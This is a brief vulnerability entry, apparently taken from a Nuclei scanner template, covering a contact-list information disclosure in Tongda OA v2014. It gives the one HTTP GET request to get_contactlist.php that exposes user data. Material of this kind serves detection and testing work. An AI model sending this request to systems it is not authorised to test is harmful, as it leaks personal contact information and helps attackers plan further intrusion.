# Vulnerability: Tongda OA v2014 Get Contactlistt - Sensitive Information Disclosure
**Classification:** TONGDA
**Source:** Nuclei Template (`tongda-contact-list-exposure.yaml`)

## Description
There is an information leakage vulnerability in the get_contactlist.php file of Tongda OA v2014. Attackers can obtain sensitive information through the vulnerability and conduct further attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
```

